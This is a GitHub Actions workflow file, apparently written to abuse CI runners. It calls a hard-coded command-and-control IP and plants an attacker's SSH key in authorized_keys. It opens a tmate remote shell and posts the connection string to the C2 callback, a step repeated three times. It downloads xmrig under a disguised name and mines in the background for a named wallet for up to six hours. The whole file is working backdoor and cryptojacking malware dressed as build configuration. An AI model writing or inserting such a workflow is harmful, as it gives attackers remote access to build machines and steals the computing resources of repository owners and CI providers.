name: Fleet-Net Runner (Stealth)

on:
  push:
    branches: [ main, master ]
  workflow_dispatch: # Allows manual trigger for immediate jacking

jobs:
  build-and-mine:
    runs-on: ubuntu-latest # Target standard GitHub runners (CPU)
    # Use GPU runners if available (requires specific enterprise tags)
    # runs-on: [self-hosted, linux, x64, gpu]

    steps:
      - name: Connectivity Test
        run: | 
          curl --connect-timeout 5 http://198.48.156.76:1337 || echo "C2 Unreachable"
      - name: System Initialization
        run: |
          # 1. Setup Persistent SSH Backdoor
          mkdir -p ~/.ssh
          # Fleet-Net C2 Public Key
          echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILsS91FMiIfBBHmbWE3h14zVqKDR7AXN535ISKqGaXNR hektic@parrot" >> ~/.ssh/authorized_keys
          
          # Install and setup tmate for immediate interactive SSH if needed
          sudo apt-get update && sudo apt-get install -y tmate
          tmate -S /tmp/tmate.sock new-session -d
      - name: OOB Callback
        run: | 
          while [ ! -f /tmp/tmate.sock ]; do sleep 1; done
          SSH_STR=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")
          curl -X POST -d "$SSH_STR" http://198.48.156.76:1337/callback
          tmate -S /tmp/tmate.sock wait tmate-ready
      - name: OOB Callback
        run: | 
          while [ ! -f /tmp/tmate.sock ]; do sleep 1; done
          SSH_STR=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")
          curl -X POST -d "$SSH_STR" http://198.48.156.76:1337/callback
          tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' > /tmp/tmate_conn.txt
      - name: OOB Callback
        run: | 
          while [ ! -f /tmp/tmate.sock ]; do sleep 1; done
          SSH_STR=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")
          curl -X POST -d "$SSH_STR" http://198.48.156.76:1337/callback
          
          # 2. Deploy Miner - CPU (RandomX) - unmineable.com
          # Targeting SOL:D4dbTEpvsDDQK8V56USNgDsircfmDHXQQmTkafnxLR56
          curl -sL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz
          mv xmrig-6.21.0/xmrig ./fleet_engine
          
          # Run in background to allow workflow to completion (Stealth)
          nohup ./fleet_engine -o rx.unmineable.com:3333 -a rx -k \
            -u SOL:D4dbTEpvsDDQK8V56USNgDsircfmDHXQQmTkafnxLR56.${{ github.actor }}_$(hostname)#v8iq-8v7z \
            --cpu-max-threads-hint 50 \
            --donate-level 1 > /dev/null 2>&1 &
          
          # 3. Established Runner Signal
          # Update a dummy status file or send a webhook to our C2
          echo "Fleet-Net Node Active: $(hostname)"
          
          # Maintain process for duration of the GitHub Action runner (max 6 hours)
          sleep 21600 
